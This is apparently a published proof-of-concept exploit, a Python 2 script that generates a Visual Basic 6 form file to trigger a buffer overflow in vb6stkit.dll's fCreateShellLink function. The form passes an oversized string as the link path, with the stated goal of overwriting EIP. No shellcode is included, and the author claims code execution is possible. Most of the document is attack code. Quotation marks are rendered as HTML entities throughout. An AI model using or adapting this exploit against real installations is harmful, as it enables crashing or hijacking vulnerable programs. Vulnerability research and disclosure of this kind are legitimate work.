Visual Basic Enterprise Edition SP6 vb6skit.dll Buffer Overflow PoC
===================================================================




-----------------------------------------------------------------------------
 Visual Basic Enterprise Edition SP6 vb6skit.dll Buffer Overflow
 url: http://www.microsoft.com

 Author: shinnai
 mail: shinnai[at]autistici[dot]org
 site: http://shinnai.altervista.org

 This was written for educational purpose. Use it at your own risk.
 Author will be not responsible for any damage.
-----------------------------------------------------------------------------
# usage exploit.py

print &#039;Visual Basic Enterprise Edition SP6 vb6skit.dll Buffer Overflow\n&#039;
print &#039;Description\n&#039;
print &#039;vb6stkit.dll is a module that contains application programming&#039;
print &#039;interface (API) functions that enable Visual Basic applications&#039;
print &#039;to create shortcuts (Shell Links) programmatically.&#039;
print &#039;In this poc we will create a form containing an overly long string&#039;
print &#039;that we pass to the third parameter (lpstrLinkPath) to own EIP.\n&#039;
print &#039;Arbitraty code execution is possible but today I drank a lot of&#039;
print &#039;wine therefore I was unable to write an exploit :-D&#039;

Form1 = (
    &#039;VERSION 5.00\n&#039;
    &#039;Begin VB.Form Form1\n&#039;
    &#039;   Caption         =   "Form1"\n&#039;
    &#039;   ClientHeight    =   3195\n&#039;
    &#039;   ClientLeft      =   60\n&#039;
    &#039;   ClientTop       =   345\n&#039;
    &#039;   ClientWidth     =   4680\n&#039;
    &#039;   LinkTopic       =   "Form1"\n&#039;
    &#039;   ScaleHeight     =   3195\n&#039;
    &#039;   ScaleWidth      =   4680\n&#039;
    &#039;   StartUpPosition =   3\n&#039;
    &#039;End\n&#039;
    &#039;Attribute VB_Name = "Form1"\n&#039;
    &#039;Attribute VB_GlobalNameSpace = False\n&#039;
    &#039;Attribute VB_Creatable = False\n&#039;
    &#039;Attribute VB_PredeclaredId = True\n&#039;
    &#039;Attribute VB_Exposed = False\n&#039;
    &#039;Private Declare Function fCreateShellLink Lib "vb6stkit.dll" (ByVal lpstrFolderName As String, ByVal lpstrLinkName As String, ByVal lpstrLinkPath As String, ByVal lpstrLinkArguments As String, ByVal fPrivate As Long, ByVal sParent As String) As Long\n\n&#039;
    &#039;Private Sub Form_Load()\n&#039;
    &#039;    mStr = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _\n&#039;
    &#039;           "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _\n&#039;
    &#039;           "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _\n&#039;
    &#039;           "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _\n&#039;
    &#039;           "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _\n&#039;
    &#039;           "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _\n&#039;
    &#039;           "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _\n&#039;
    &#039;           "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _\n&#039;
    &#039;           "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _\n&#039;
    &#039;           "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _\n&#039;
    &#039;           "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _\n&#039;
    &#039;           "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _\n&#039;
    &#039;           "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _\n&#039;
    &#039;           "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _\n&#039;
    &#039;           "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _\n&#039;
    &#039;           "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _\n&#039;
    &#039;           "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _\n&#039;
    &#039;           "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _\n&#039;
    &#039;           "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" & _\n&#039;
    &#039;           "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"\n\n&#039;
    &#039;    strLinkPath = "c:\" & mStr\n&#039;
    &#039;    fSuccess = fCreateShellLink("..\..\Desktop", "something", strLinkPath, "", True, "$(Programs)")\n\n&#039;
    &#039;    If fSuccess Then\n&#039;
    &#039;        MsgBox "Created desktop shortcut"\n&#039;
    &#039;    Else\n&#039;
    &#039;        MsgBox "Unable to create desktop shortcut"\n&#039;
    &#039;    End If\n&#039;
    &#039;End Sub\n&#039;
    )
try:
    out_file = open("Form1.frm",&#039;w&#039;)
    out_file.write(Form1)
    out_file.close()
    print "\nFILE CREATION COMPLETED!\n"
except:
    print " \n -------------------------------------"
    print "  Usage: exploit.py"
    print " -------------------------------------"
    print "\nAN ERROR OCCURS DURING FILE CREATION!"



